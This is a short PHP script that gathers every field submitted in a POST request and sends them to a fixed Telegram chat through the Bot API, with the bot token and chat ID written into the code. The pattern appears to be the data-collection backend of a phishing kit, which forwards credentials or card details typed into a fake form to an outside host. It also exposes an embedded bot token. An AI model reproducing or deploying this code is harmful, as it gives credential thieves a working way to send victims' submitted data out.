<?php
$botToken = "8442134199:AAHXujH4yWse61SrhdyOLZSb_j7zEhn4P_E";
$chatId = 806494227;

$message = "";
foreach ($_POST as $key => $value) {
    $message .= "$key: $value\n";
}

$url = "https://api.telegram.org/bot$botToken/sendMessage";

file_get_contents($url . "?chat_id=$chatId&text=" . urlencode($message));
?>
